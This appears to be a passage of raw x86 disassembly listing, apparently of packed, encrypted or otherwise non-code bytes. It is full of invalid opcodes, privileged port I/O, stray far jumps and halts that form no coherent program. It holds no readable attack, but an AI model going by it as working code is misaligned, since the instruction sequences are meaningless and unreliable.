  410d23:	ficomp DWORD PTR [ebx+0x3479700]
  410d29:	inc    ecx
  410d2a:	pop    eax
  410d2b:	mov    eax,ds:0x48b1c173
  410d30:	jg     0x410d38
  410d32:	stos   DWORD PTR es:[edi],eax
  410d33:	mov    BYTE PTR [bp+si-0x37],0x46
  410d38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d39:	pushf  
  410d3a:	outs   dx,BYTE PTR ds:[esi]
  410d3b:	push   edi
  410d3c:	mov    ch,0xe5
  410d3e:	sub    dh,BYTE PTR [ebx-0xf]
  410d41:	and    DWORD PTR [ebp-0x31],ebp
  410d44:	xchg   ebp,eax
  410d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d46:	and    dh,BYTE PTR [ecx-0x7b]
  410d49:	es and eax,0xb213613e
  410d4f:	mov    fs,WORD PTR [edx+0x67]
  410d52:	out    0xfc,al
  410d54:	loop   0x410d90
  410d56:	pop    eax
  410d57:	std    
  410d58:	push   edi
  410d59:	inc    ebx
  410d5a:	inc    esi
  410d5b:	jmp    0x41e3:0xc9d48326
  410d62:	adc    ebx,DWORD PTR [ebp-0x226c324b]
  410d68:	enter  0xc6d6,0x2c
  410d6c:	push   ss
  410d6d:	xchg   ebp,eax
  410d6e:	mov    esp,ecx
  410d70:	outs   dx,BYTE PTR ds:[esi]
  410d71:	add    eax,0xd43256d0
  410d76:	mov    bl,0x28
  410d78:	imul   esp,DWORD PTR [edx+0x69],0xffffffed
  410d7c:	leave  
  410d7d:	or     bh,BYTE PTR [ecx]
  410d7f:	inc    eax
  410d80:	hlt    
  410d81:	add    eax,DWORD PTR ds:0x73e77a1
  410d87:	and    BYTE PTR [bp+si],cl
  410d8a:	cmp    eax,DWORD PTR [ecx+0x6b]
  410d8d:	xor    dl,al
  410d8f:	push   ebx
  410d90:	pop    es
  410d91:	(bad)  [ecx]
  410d93:	xchg   edx,eax
  410d94:	iret   
  410d95:	hlt    
  410d96:	out    0x87,al
  410d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d99:	push   es
  410d9a:	or     eax,0xd240eb1d
  410d9f:	sbb    BYTE PTR [edx],ah
  410da1:	imul   edx,DWORD PTR [eax],0xf493488b
  410da7:	push   ss
  410da8:	mov    edi,0xc5a9616a
  410dad:	jge    0x410e0a
  410daf:	aam    0x26
  410db1:	outs   dx,BYTE PTR ds:[esi]
  410db2:	cmp    DWORD PTR [ebx-0x1f7c42fb],esp
  410db8:	jmp    0x2bb2a8b3
  410dbd:	push   ebp
  410dbe:	cmc    
  410dbf:	xor    esi,esp
  410dc1:	inc    esp
  410dc2:	out    dx,al
  410dc3:	into   
  410dc4:	push   ecx
  410dc5:	pop    esp
  410dc6:	(bad)  
  410dc7:	leave  
  410dc8:	fimul  WORD PTR ds:0x1aad8681
  410dce:	pop    eax
  410dcf:	repnz push 0xffffff8e
  410dd2:	sar    BYTE PTR [esi+eax*2-0x62],0xee
  410dd7:	sub    eax,0x177812c
  410ddc:	es neg eax
  410ddf:	int3   
  410de0:	mov    esi,0xd0d78882
  410de5:	xor    edi,DWORD PTR [edi]
  410de7:	mov    esp,0x509c2193
  410dec:	je     0x410df7
  410dee:	or     ecx,DWORD PTR [ecx+0x50]
  410df1:	addr16 int 0x54
  410df4:	cmp    dh,BYTE PTR [eax+0x25]
  410df7:	or     edi,DWORD PTR [esi-0x1e84ff0]
  410dfd:	aas    
  410dfe:	scas   al,BYTE PTR es:[edi]
  410dff:	xor    BYTE PTR [edi+0x2a],al
  410e02:	pop    ebx
  410e03:	sub    eax,0x51
  410e06:	mov    eax,esi
  410e08:	and    ecx,DWORD PTR [edx*2-0x399e1c8d]
  410e0f:	das    
  410e10:	mov    esp,0xe364694c
  410e15:	jge    0x410da4
  410e17:	jno    0x410dea
  410e19:	out    0xe0,al
  410e1b:	xor    eax,DWORD PTR [edx-0x3d]
  410e1e:	out    dx,eax
  410e1f:	clc    
  410e20:	add    DWORD PTR [ebp+0x62d8ba22],esp
  410e26:	xor    ebp,DWORD PTR [ebx]
  410e28:	div    DWORD PTR [eax]
  410e2a:	daa    
  410e2b:	pushf  
  410e2c:	ss mov ecx,0x59d0d218
  410e32:	ret    
  410e33:	call   0x699063a1
  410e38:	(bad)  [edx-0x8]
  410e3b:	les    ebx,FWORD PTR [edi+esi*8-0x18bd7b27]
  410e42:	sbb    al,0x8f
  410e44:	lds    ebp,FWORD PTR [ebx]
  410e46:	sbb    eax,0x75ba65a6
  410e4b:	std    
  410e4c:	xchg   ebp,eax
  410e4d:	pop    es
  410e4e:	shr    DWORD PTR [esi+ecx*1-0x42],cl
  410e52:	pop    edx
  410e53:	mov    edi,0xac10b58e
  410e58:	nop
  410e59:	pop    eax
  410e5a:	mov    dh,0x65
  410e5c:	sbb    DWORD PTR [ebx],ebx
  410e5e:	inc    esp
  410e5f:	mov    DWORD PTR [edi],ebx
  410e61:	inc    esi
  410e62:	repz dec esp
  410e64:	outs   dx,DWORD PTR ds:[esi]
  410e65:	add    al,0x78
  410e67:	scas   al,BYTE PTR es:[edi]
  410e68:	and    al,0x4e
  410e6a:	mov    dh,0x8b
  410e6c:	push   esp
  410e6d:	add    BYTE PTR [edi+ebp*4+0x8fdc2f8],0x86
  410e75:	dec    edi
  410e76:	fnstcw WORD PTR [eax-0xab63d6f]
  410e7c:	mov    ebp,0x3202ff94
  410e81:	jo     0x410ef8
  410e83:	push   DWORD PTR [edx+edx*2]
  410e86:	in     al,dx
  410e87:	jg     0x410e85
  410e89:	sbb    DWORD PTR [ecx],esi
  410e8b:	cmp    al,0xb1
  410e8d:	pop    ss
  410e8e:	clc    
  410e8f:	inc    esi
  410e90:	mov    ch,0xb
  410e92:	int    0x50
  410e94:	push   esi
  410e95:	dec    ecx
  410e96:	or     ebp,esp
  410e98:	ins    DWORD PTR es:[edi],dx
  410e99:	js     0x410ea1
  410e9b:	mov    ds,WORD PTR [esi+0x76]
  410e9e:	repnz or esp,DWORD PTR [ecx]
  410ea1:	out    dx,eax
  410ea2:	xor    eax,0xd427bffc
  410ea7:	cmp    eax,DWORD PTR [edx+0x59]
  410eaa:	hlt    
  410eab:	jb     0x410f22
  410ead:	mov    DWORD PTR [edi],esp
  410eaf:	in     eax,dx
  410eb0:	xor    eax,0xbc232a45
  410eb5:	and    edi,ecx
  410eb7:	inc    ebx
  410eb8:	rcr    DWORD PTR [edi-0x6f],cl
  410ebb:	jb     0x410f2e
  410ebd:	push   esp
  410ebe:	inc    esp
  410ebf:	pop    ecx
  410ec0:	es cld 
  410ec2:	out    dx,al
  410ec3:	call   0xed471d5e
  410ec8:	jbe    0x410f15
  410eca:	pop    ss
  410ecb:	iret   
  410ecc:	imul   eax,DWORD PTR [edx],0xfffffffe
  410ecf:	mov    esi,0x8155a2e5
  410ed4:	mov    edx,0xf9628ca2
  410ed9:	loop   0x410f59
  410edb:	sar    BYTE PTR [esi-0x68],cl
  410ede:	push   ebx
  410edf:	pushf  
  410ee0:	xor    ah,BYTE PTR [eax+0x2c]
  410ee3:	mov    DWORD PTR [ebp-0xd795739],esp
  410ee9:	xor    esi,edi
  410eeb:	(bad)  
  410eed:	out    0xd7,eax
  410eef:	inc    ebp
  410ef0:	cs mov dl,0xf1
  410ef3:	mov    WORD PTR [esi+0x489dd08d],es
  410ef9:	jle    0x410f41
  410efb:	push   ecx
  410efc:	rcr    DWORD PTR [edx-0x3d060d0f],1
  410f02:	sti    
  410f03:	adc    eax,0xd0d1cb88
  410f08:	icebp  
  410f09:	and    esi,DWORD PTR [eax]
  410f0b:	cmp    ah,bl
  410f0d:	sbb    edi,DWORD PTR [ebx+0x26207791]
  410f13:	dec    esi
  410f14:	mov    eax,0x40137950
  410f19:	retf   0xa17e
  410f1c:	popa   
  410f1d:	outs   dx,BYTE PTR ds:[esi]
  410f1e:	outs   dx,DWORD PTR ds:[esi]
  410f1f:	call   0x5c20:0x90546d04
  410f26:	sbb    al,0x74
  410f28:	jne    0x410f69
  410f2a:	or     eax,0x76b3992d
  410f2f:	jne    0x410f4d
  410f31:	out    0xff,al
  410f33:	pop    es
  410f34:	push   edx
  410f35:	(bad)  
  410f36:	sbb    bl,BYTE PTR [edi]
  410f38:	sti    
  410f39:	inc    edx
  410f3a:	(bad)  
  410f3b:	imul   esi,DWORD PTR [eax-0x4498a21d],0xffffffa5
  410f42:	cmp    eax,0xe0707be
  410f47:	sub    eax,0xecf7a3d5
  410f4c:	sbb    eax,0xaa233d5d
  410f51:	in     al,dx
  410f52:	pop    ds
  410f53:	push   ss
  410f54:	into   
  410f55:	shl    bl,cl
  410f57:	xchg   BYTE PTR [edi],dl
  410f59:	ror    BYTE PTR [ecx-0x5a],0x30
  410f5d:	xchg   esp,eax
  410f5e:	test   eax,0x9d5d868c
  410f63:	or     BYTE PTR [ebp+0x3106a5dd],bh
  410f69:	jp     0x410ef3
  410f6b:	test   al,0xd2
  410f6d:	mov    esp,0xb94dd6ff
  410f72:	jge    0x410f5a
  410f74:	add    eax,0xf774d2c0
  410f7a:	lods   eax,DWORD PTR ds:[esi]
  410f7b:	stos   BYTE PTR es:[edi],al
  410f7c:	adc    al,0xcf
  410f7e:	test   bh,dl
  410f80:	cmp    BYTE PTR [edx],ah
  410f82:	xchg   edi,eax
  410f83:	xchg   edi,eax
  410f84:	loop   0x410fe7
  410f86:	jbe    0x411007
  410f88:	cmp    DWORD PTR [ecx-0x1ec1f978],0x3cfcc133
  410f92:	fimul  WORD PTR [ebx+0x17]
  410f95:	inc    ecx
  410f96:	cli    
  410f97:	xor    al,0x25
  410f99:	pop    ds
  410f9a:	lock shl BYTE PTR [ebp+0x513eb141],cl
  410fa1:	adc    DWORD PTR [ebx+0x49],ebp
  410fa4:	mov    eax,ds:0xfdbd159b
  410fa9:	stc    
  410faa:	cmp    edi,esp
  410fac:	ret    0xa1c
  410faf:	shl    esp,1
  410fb1:	pop    ebx
  410fb2:	or     BYTE PTR [ebx+0x7158e6c1],0xc7
  410fb9:	cmp    al,0xed
  410fbb:	(bad)  
  410fbc:	cmp    DWORD PTR [edx],ecx
  410fbe:	fwait
  410fbf:	daa    
  410fc0:	ins    BYTE PTR es:[edi],dx
  410fc1:	add    DWORD PTR [ebp-0x23],eax
  410fc4:	pop    esp
  410fc5:	test   eax,0xdd80fff0
  410fca:	shl    DWORD PTR [ebx-0x2d9def0d],cl
  410fd0:	(bad)  [esi+0x2f]
  410fd3:	jae    0x410f95
  410fd5:	sub    ebp,DWORD PTR [ebp+esi*2+0x79]
  410fd9:	add    BYTE PTR [eax],0xbd
  410fdc:	rol    DWORD PTR [ecx-0x24],1
  410fdf:	sub    ah,bl
  410fe1:	lahf   
  410fe2:	sbb    DWORD PTR [eax-0x17],ebx
  410fe5:	fdiv   DWORD PTR ds:[esi]
  410fe8:	mov    al,ds:0x95805c71
  410fed:	cmc    
  410fee:	andnps xmm4,XMMWORD PTR [ecx]
  410ff1:	fwait
  410ff2:	stos   BYTE PTR es:[edi],al
  410ff3:	lahf   
  410ff4:	into   
  410ff5:	arpl   WORD PTR [ecx+0x53],ax
  410ff8:	adc    al,BYTE PTR [eax-0x61]
  410ffb:	xchg   ebp,eax
  410ffc:	sub    BYTE PTR [edi-0x61],cl
  410fff:	lock cmp al,0xdf
  411002:	lods   eax,DWORD PTR ds:[esi]
  411003:	sub    cl,BYTE PTR [edx]
  411005:	cli    
  411006:	mov    bh,0xa9
  411008:	stos   BYTE PTR es:[edi],al
  411009:	test   BYTE PTR [esi+0x42],dl
  41100c:	pop    ds
  41100d:	pop    esp
  41100e:	ret    0x8b8
  411011:	jl     0x410fed
  411013:	dec    eax
  411014:	sub    ah,BYTE PTR [ebp+0x67]
  411017:	and    edi,DWORD PTR [edi]
  411019:	push   ecx
  41101a:	push   ecx
  41101b:	dec    ecx
  41101c:	add    DWORD PTR [edi-0x43815880],0xffffff9f
  411023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411024:	jge    0x411068
  411026:	(bad)  
  411027:	jg     0x4110a3
  411029:	test   eax,0xcc02daa1
  41102e:	cmp    eax,0x864ecb01
  411033:	or     ch,BYTE PTR [ebx+0x291bc6c9]
  411039:	sbb    dh,ah
  41103b:	das    
  41103c:	jnp    0x4110ae
  41103e:	fs stos DWORD PTR es:[edi],eax
  411040:	aaa    
  411041:	sub    DWORD PTR [esi-0x664f49c4],esi
  411047:	jmp    FWORD PTR [esi]
  411049:	clc    
  41104a:	int    0x84
  41104c:	mov    cl,0x6a
  41104e:	adc    eax,0x716f51b5
  411053:	mul    DWORD PTR ds:0x37c45f21
  411059:	push   edx
  41105a:	pop    esi
  41105b:	fadd   QWORD PTR [esp+eax*4-0x394ce652]
  411062:	fld    QWORD PTR [edi]
  411064:	dec    esi
  411065:	wbinvd 
  411067:	inc    edi
  411068:	popa   
  411069:	fnstenv [edx-0x4307de5d]
  41106f:	mov    bl,0x7b
  411071:	mov    bl,0x41
  411073:	retf   
  411074:	dec    BYTE PTR [esi+ebp*4]
  411077:	(bad)  
  411078:	shl    DWORD PTR [ebx],1
  41107a:	loope  0x4110f5
  41107c:	jnp    0x4110e7
  41107e:	clc    
  41107f:	push   edx
  411080:	xchg   edi,eax
  411081:	rcl    eax,1
  411083:	pop    ecx
  411084:	mov    WORD PTR [ebp-0x37068737],fs
  41108a:	test   eax,0x8eba5537
  41108f:	push   ebx
  411090:	xor    eax,DWORD PTR [ebx-0x11154e52]
  411096:	push   ebx
  411097:	test   eax,0x90085551
  41109c:	fadd   DWORD PTR [ecx+0x6d1bed83]
  4110a2:	mov    eax,ds:0xf6d8bfe1
  4110a7:	or     al,BYTE PTR [esi+0x4f]
  4110aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110ab:	push   esp
  4110ac:	aaa    
  4110ad:	jecxz  0x411083
  4110af:	shufps xmm5,xmm2,0xc2
  4110b3:	push   ebp
  4110b4:	fs into 
  4110b6:	(bad)  [edx]
  4110b8:	mov    fs,esp
  4110ba:	push   eax
  4110bb:	ins    DWORD PTR es:[edi],dx
  4110bc:	add    cl,BYTE PTR [ebx-0x68eaac47]
  4110c2:	push   eax
  4110c3:	inc    ebp
  4110c4:	mov    ecx,0x3acf7bb2
  4110c9:	out    dx,al
  4110ca:	bound  ebp,QWORD PTR [eax+0x4f]
  4110cd:	inc    ebp
  4110ce:	or     ebx,DWORD PTR [ecx+0x7695d095]
  4110d4:	ret    
  4110d5:	dec    ebx
  4110d6:	push   ecx
  4110d7:	jae    0x4110ed
  4110d9:	xchg   esp,eax
  4110da:	outs   dx,BYTE PTR ds:[esi]
  4110db:	in     al,dx
  4110dc:	lds    esi,FWORD PTR [ecx+0x55]
  4110df:	fdivrp st(6),st
  4110e1:	mov    eax,ds:0x2af47038
  4110e6:	mov    ah,0x9f
  4110e8:	mov    ebp,0x7d631a68
  4110ed:	lods   al,BYTE PTR ds:[esi]
  4110ee:	add    eax,0x55aeec5f
  4110f3:	(bad)  
  4110f4:	pop    edi
  4110f5:	aas    
  4110f6:	lahf   
  4110f7:	and    ecx,esp
  4110f9:	jg     0x41112a
  4110fb:	or     esi,DWORD PTR [edi+0x8fd27e8]
  411101:	mov    bl,0xaa
  411103:	call   0xda2e:0x2f15ee2d
  41110a:	push   ebx
  41110b:	cld    
  41110c:	and    BYTE PTR [ecx-0x5907184f],cl
  411112:	aas    
  411113:	cmc    
  411114:	daa    
  411115:	sub    ch,bh
  411117:	stos   DWORD PTR es:[edi],eax
  411118:	xor    ebx,DWORD PTR [eax-0x4c02e127]
  41111e:	loope  0x4110a6
  411120:	or     ecx,DWORD PTR [ebp-0x25ec885b]
  411126:	adc    esi,DWORD PTR cs:[ebp-0x3da98c01]
  41112d:	mov    ecx,esp
  41112f:	stos   BYTE PTR es:[edi],al
  411130:	jmp    0xa0856331
  411135:	push   edi
  411136:	test   al,0xb4
  411138:	xor    ebx,DWORD PTR [edx-0x2c]
  41113b:	pop    eax
  41113c:	pop    ds
  41113d:	gs test eax,0x6d75c30
  411143:	sub    al,0x66
  411145:	xlat   BYTE PTR ds:[ebx]
  411146:	sar    DWORD PTR [esi],cl
  411148:	push   0x820f8aef
  41114d:	popf   
  41114e:	jl     0x411176
  411150:	jno    0x4110f0
  411152:	mov    eax,ds:0xe1e9147c
  411157:	cmp    BYTE PTR ss:[ebp+0x61],cl
  41115b:	push   ebx
  41115c:	shl    BYTE PTR [ebx+0x39],1
  41115f:	iret   
  411160:	cmp    DWORD PTR gs:0x8e9899eb,esp
  411167:	stc    
  411168:	mov    cl,0x57
  41116a:	or     BYTE PTR [ebx-0x1efcde3d],ah
  411170:	(bad)  
  411171:	ret    0x977c
  411174:	push   es
  411175:	push   ds
  411176:	les    edx,FWORD PTR [edi]
  411178:	adc    eax,0xcbfde7c8
  41117d:	ds sub al,0xa6
  411180:	xchg   ebp,eax
  411181:	out    dx,eax
  411182:	jmp    0x4111cd
  411184:	arpl   WORD PTR [ebp+0x3665c85b],di
  41118a:	and    esi,0xc2f99550
  411190:	push   es
  411191:	add    BYTE PTR [ebp+0x75fb1381],bh
  411197:	sub    cl,BYTE PTR [ebx+0x6d]
  41119a:	nop
  41119b:	test   eax,0x82682e40
  4111a0:	mov    ebx,edi
  4111a2:	fld    DWORD PTR cs:[edi]
  4111a5:	(bad)  
  4111a6:	lds    ebp,FWORD PTR [edi]
  4111a8:	jmp    0xdbbc:0x2bafb802
  4111af:	call   FWORD PTR [ebp-0x8]
  4111b2:	mov    ebp,0xb8abb797
  4111b7:	bound  ebx,QWORD PTR [esi]
  4111b9:	add    eax,0x95c69cb4
  4111be:	call   0xe67d:0x53834cf3
  4111c5:	retf   
  4111c6:	push   cs
  4111c7:	push   0xffffffa3
  4111c9:	fcom   DWORD PTR [ecx-0x30]
  4111cc:	mov    WORD PTR [ebp+ebp*1+0x1f1cbf43],?
  4111d3:	test   BYTE PTR [ecx+0x1a],bl
  4111d6:	ret    
  4111d7:	sub    al,0x54
  4111d9:	adc    eax,0x76ba0af5
  4111de:	std    
  4111df:	stc    
  4111e0:	pop    eax
  4111e1:	nop
  4111e2:	in     al,0xad
  4111e4:	aam    0x1f
  4111e6:	shl    DWORD PTR [esi-0x6d775182],cl
  4111ec:	pusha  
  4111ed:	dec    edx
  4111ee:	pop    ecx
  4111ef:	lahf   
  4111f0:	cmp    DWORD PTR [eax-0x4b64dd2],esp
  4111f6:	or     edi,DWORD PTR [edi+0x1763cc6b]
  4111fc:	stos   BYTE PTR es:[edi],al
  4111fd:	mov    ecx,0xa6375754
  411202:	in     eax,0xde
  411204:	je     0x411216
  411206:	rcr    DWORD PTR es:[ecx+eiz*4-0x26],1
  41120b:	xchg   ebp,eax
  41120c:	imul   edi,DWORD PTR [esi-0x6984cd16],0xffffff81
  411213:	cli    
  411214:	rcr    DWORD PTR [edi+0x6],1
  411217:	sahf   
  411218:	push   cs
  411219:	jne    0x41127f
  41121b:	imul   esi,eax,0xffffffe2
  41121e:	inc    edx
  41121f:	dec    esi
  411220:	out    dx,eax
  411221:	and    BYTE PTR [edx+esi*4],bh
  411224:	cmp    al,BYTE PTR [esi]
  411226:	jbe    0x4111b0
  411228:	enter  0xfce,0x1c
  41122c:	lods   al,BYTE PTR ds:[esi]
  41122d:	jb     0x411254
  41122f:	sub    ch,BYTE PTR [ebx-0x70]
  411232:	mov    BYTE PTR [edi],ch
  411234:	sub    dl,BYTE PTR [ebx+0x7712837d]
  41123a:	push   ss
  41123b:	daa    
  41123c:	add    eax,DWORD PTR [esi+edx*4-0x37]
  411240:	sub    DWORD PTR [edx-0x7a],0xaf2fab58
  411247:	dec    edi
  411248:	daa    
  411249:	outs   dx,DWORD PTR ds:[esi]
  41124a:	jnp    0x411223
  41124c:	mov    ch,0x4e
  41124e:	loopne 0x41120d
  411250:	std    
  411251:	popf   
  411252:	iret   
  411253:	push   es
  411254:	(bad)  
  411255:	jl     0x411213
  411257:	push   ds
  411258:	dec    ecx
  411259:	mov    BYTE PTR [ecx+edx*1],dl
  41125c:	lock inc esp
  41125e:	aam    0xff
  411260:	outs   dx,DWORD PTR ds:[esi]
  411261:	call   0x2374196
  411266:	pop    esp
  411267:	xchg   BYTE PTR [edx],ah
  411269:	mov    edi,0x8207c848
  41126e:	pop    ss
  41126f:	cmp    DWORD PTR [esi+0x71],edx
  411272:	push   0x73
  411274:	adc    edx,ebx
  411276:	jb     0x41123b
  411278:	mov    dl,0xb
  41127a:	cmp    ah,ch
  41127c:	jmp    0x468ab4ca
  411281:	xchg   DWORD PTR [ebp-0x63e11eff],esi
  411287:	pushf  
  411288:	jmp    0x4112fd
  41128a:	inc    ecx
  41128b:	(bad)  
  41128c:	jle    0x4112a2
  41128e:	loope  0x4112fc
  411290:	int3   
  411291:	ins    BYTE PTR es:[edi],dx
  411292:	xchg   ecx,eax
  411293:	rol    edi,0xf9
  411296:	out    dx,eax
  411297:	mov    DWORD PTR [esi-0x76],ebp
  41129a:	xchg   BYTE PTR ds:[eax*8+0x132f0a4e],dh
  4112a2:	fnsave [ebp+0x2db2ae9d]
  4112a8:	xchg   DWORD PTR [esp+esi*1-0x477098db],ebp
  4112af:	mov    al,ds:0xf164d1b6
  4112b4:	dec    esp
  4112b5:	xchg   BYTE PTR [ebp+0x45],bl
  4112b8:	fstp   TBYTE PTR [esi+edi*2+0x58f867b]
  4112bf:	or     BYTE PTR [eax+0x5deea117],0x8e
  4112c6:	inc    esp
  4112c7:	call   FWORD PTR [ecx+0x4d]
  4112ca:	jmp    0xf1f8e8b3
  4112cf:	mov    ch,0x2b
  4112d1:	push   0xeea2152c
  4112d6:	dec    ecx
  4112d7:	cmp    eax,ebp
  4112d9:	rol    ebx,cl
  4112db:	sbb    eax,0x623de141
  4112e0:	pusha  
  4112e1:	xchg   BYTE PTR [edi-0x2d],cl
  4112e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e5:	xchg   esi,esp
  4112e7:	into   
  4112e8:	push   edi
  4112e9:	and    BYTE PTR [ebp+edx*4-0x13],0x33
  4112ee:	mov    ah,0x2e
  4112f0:	(bad)  
  4112f2:	jmp    0x4112ba
  4112f4:	inc    esp
  4112f5:	nop
  4112f6:	mov    eax,0x9357d4d0
  4112fb:	cld    
  4112fc:	out    0xc0,eax
  4112fe:	nop
  4112ff:	xor    al,0xcb
  411301:	pop    esp
  411302:	lahf   
  411303:	jecxz  0x4112b4
  411305:	mov    DWORD PTR [edx],0xb01985d1
  41130b:	test   DWORD PTR [edi+0x13],esi
  41130e:	rol    BYTE PTR [esi-0x6d6ea37b],cl
  411314:	jbe    0x411328
  411316:	jne    0x411372
  411318:	sbb    eax,0x82456247
  41131d:	int    0xec
  41131f:	scas   al,BYTE PTR es:[edi]
  411320:	pop    ss
  411321:	push   ecx
  411322:	inc    edi
  411323:	sbb    BYTE PTR [ebx-0x66c7459c],dl
  411329:	xchg   esi,eax
  41132a:	or     al,0xeb
  41132c:	into   
  41132d:	sti    
  41132e:	mov    dh,0xd4
  411330:	cld    
  411331:	mov    ecx,DWORD PTR [ebp+esi*1+0x392be152]
  411338:	fld    TBYTE PTR [ecx+esi*8-0x578b0dc8]
  41133f:	mov    ch,0x75
  411341:	shl    esp,1
  411343:	pop    es
  411344:	shl    BYTE PTR [edi],1
  411346:	loopne 0x4112ed
  411348:	les    edx,FWORD PTR [eax-0x1d]
  41134b:	loope  0x4112e0
  41134d:	imul   edx,DWORD PTR gs:[ecx+ebx*2],0xa833aa29
  411355:	inc    edx
  411356:	inc    DWORD PTR [eax-0x5bb99f2e]
  41135c:	push   ecx
  41135d:	les    edi,FWORD PTR [ebp+0x28dd76da]
  411363:	inc    esp
  411364:	mov    ds:0x72fe36bf,eax
  411369:	jecxz  0x41136e
  41136b:	pop    esp
  41136c:	xchg   ebp,eax
  41136d:	ja     0x4112f1
  41136f:	mov    esi,0xf04f831d
  411374:	jmp    0x4112fb
  411376:	jge    0x411368
  411378:	inc    ebp
  411379:	and    ah,BYTE PTR [ecx+0x58]
  41137c:	repz int3 
  41137e:	mov    ecx,DWORD PTR [edi-0xc]
  411381:	ja     0x4113dd
  411383:	dec    edi
  411384:	adc    al,cl
  411386:	cmp    dl,BYTE PTR [ebp-0x53]
  411389:	xor    BYTE PTR [edx+0x5b],dl
  41138c:	push   0x23fcae19
  411391:	sti    
  411392:	push   ds
  411393:	jl     0x41134f
  411395:	inc    ebx
  411396:	sbb    DWORD PTR [ebx+ebp*8-0x76d4bdec],edx
  41139d:	adc    al,0x5a
  41139f:	or     al,0xf5
  4113a1:	add    al,0xb0
  4113a3:	outs   dx,DWORD PTR ds:[esi]
  4113a4:	stos   DWORD PTR es:[edi],eax
  4113a5:	sub    BYTE PTR [ebx+esi*1-0x444c158c],al
  4113ac:	ja     0x411337
  4113ae:	outs   dx,DWORD PTR ds:[esi]
  4113af:	dec    esi
  4113b0:	cli    
  4113b1:	call   0x52f55be
  4113b6:	inc    ebx
  4113b7:	inc    ebx
  4113b8:	jmp    0x4113f9
  4113ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113bb:	mov    ds:0x46fa3f3a,al
  4113c0:	loopne 0x4113e2
  4113c2:	in     eax,0x1d
  4113c4:	outs   dx,BYTE PTR ds:[esi]
  4113c5:	ret    0x16c7
  4113c8:	mov    eax,DWORD PTR [esi-0x34]
  4113cb:	enter  0x6255,0xef
  4113cf:	jecxz  0x4113c3
  4113d1:	mov    al,0x4c
  4113d3:	xchg   DWORD PTR [esi+0x68],ecx
  4113d6:	lods   al,BYTE PTR ds:[esi]
  4113d7:	lea    eax,[eax]
  4113d9:	aad    0xc9
  4113db:	in     eax,dx
  4113dc:	popf   
  4113dd:	push   0xb63092c9
  4113e2:	adc    ebp,edx
  4113e4:	ror    DWORD PTR [eax+0x4a],0x6c
  4113e8:	dec    edi
  4113e9:	out    0xa1,eax
  4113eb:	adc    DWORD PTR [eax],ebp
  4113ed:	aam    0x8e
  4113ef:	aad    0x7
  4113f1:	mov    eax,DWORD PTR [edi-0x4f]
  4113f4:	inc    ebp
  4113f5:	in     al,0xbd
  4113f7:	repnz mov eax,ds:0x83cd945d
  4113fd:	pop    ds
  4113fe:	cmp    ebx,esi
  411400:	data16 and ch,BYTE PTR [edx]
  411403:	cdq    
  411404:	les    ebx,FWORD PTR [eax+esi*8]
  411407:	(bad)  
  411408:	scas   eax,DWORD PTR es:[edi]
  411409:	loope  0x41147e
  41140b:	sar    eax,0x84
  41140e:	mov    eax,ds:0x63be0720
  411413:	sub    eax,0x6031ec7c
  411418:	push   ss
  411419:	adc    BYTE PTR [esi+0x6e34c034],ah
  41141f:	scas   eax,DWORD PTR es:[edi]
  411420:	imul   esi,DWORD PTR [ebx+ebp*2+0x8ebcb60],0x2e
  411428:	xchg   edi,eax
  411429:	push   esp
  41142a:	cmp    bh,BYTE PTR [eax-0x3b]
  41142d:	mov    cl,0xb8
  41142f:	lods   eax,DWORD PTR ds:[esi]
  411430:	scas   al,BYTE PTR es:[edi]
  411431:	inc    esp
  411432:	icebp  
  411433:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411434:	call   0xc966:0x5b40eebe
  41143b:	jmp    0x7357:0x8d8bfb26
  411442:	sbb    BYTE PTR [edx+0x6c],bh
  411445:	ja     0x4113ec
  411447:	xor    al,0x56
  411449:	(bad)  
  41144a:	bound  ebp,QWORD PTR [ebp-0x70a4cc2a]
  411450:	vpmulhuw ymm0,ymm3,YMMWORD PTR [eax+0x1aeaa36]
  411458:	cs dec ecx
  41145a:	das    
  41145b:	or     bp,WORD PTR [eax+0x56fe72f]
  411462:	out    0x4a,al
  411464:	xor    al,0x14
  411466:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411468:	and    eax,0xa4492d21
  41146d:	jle    0x4114a4
  41146f:	cmp    DWORD PTR [ecx+0x43],ebx
  411472:	sub    DWORD PTR [ebx+0x1c],edi
  411475:	xchg   DWORD PTR [edi],ebp
  411477:	xchg   edx,eax
  411478:	shr    BYTE PTR [edi+ebx*4],cl
  41147b:	pop    ebp
  41147c:	mov    dh,BYTE PTR [esi+0x43]
  41147f:	adc    BYTE PTR [ebx-0x328160f5],al
  411485:	sti    
  411486:	retf   0x1341
  411489:	popf   
  41148a:	pop    ss
  41148b:	ins    DWORD PTR es:[edi],dx
  41148c:	push   0xffffffa4
  41148e:	sbb    eax,0xab5404f2
  411493:	dec    ebp
  411494:	adc    edi,DWORD PTR [ebx]
  411496:	push   ebx
  411497:	mov    al,0xe7
  411499:	and    eax,DWORD PTR [eax]
  41149b:	aas    
  41149c:	jmp    0xf5b5:0x555b52f4
  4114a3:	repz mov edx,0x8e8a1536
  4114a9:	cmp    edi,eax
  4114ab:	push   edi
  4114ac:	pop    ds
  4114ad:	in     al,0x60
  4114af:	cmc    
  4114b0:	sub    DWORD PTR [esi-0x3e919a92],ecx
  4114b6:	shl    DWORD PTR [eax-0x65],1
  4114b9:	jl     0x411480
  4114bb:	in     al,dx
  4114bc:	sub    bh,ch
  4114be:	or     dl,BYTE PTR [bp+di-0x1710]
  4114c3:	imul   esi,DWORD PTR [ebx+0x6a134b19],0xd08e11e6
  4114cd:	fild   QWORD PTR [ebx+0xe3b41d5]
  4114d3:	out    dx,al
  4114d4:	repnz mov ds:0xf8905ea4,al
  4114da:	xor    DWORD PTR [ebp-0x75e44f1],0xe3bba79c
  4114e4:	mov    BYTE PTR [edi],ch
  4114e6:	sbb    ebp,ebx
  4114e8:	or     edi,eax
  4114ea:	mov    BYTE PTR [ecx-0x25],dh
  4114ed:	xchg   esp,eax
  4114ee:	lods   al,BYTE PTR ds:[esi]
  4114ef:	mov    ch,0x73
  4114f1:	pop    edi
  4114f2:	sahf   
